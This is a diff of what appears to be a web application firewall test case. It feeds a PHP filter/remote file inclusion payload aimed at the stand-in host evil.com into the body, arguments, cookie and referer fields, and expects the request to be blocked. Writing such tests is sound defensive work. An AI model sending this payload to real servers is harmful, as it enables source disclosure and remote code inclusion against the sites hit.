@@ -5,9 +5,7 @@
         "Body": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
         "ARGS": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
         "Cookie": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "URL": "",
         "Referer": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "Headers": "",
         "Blocked": true
       }
     ]
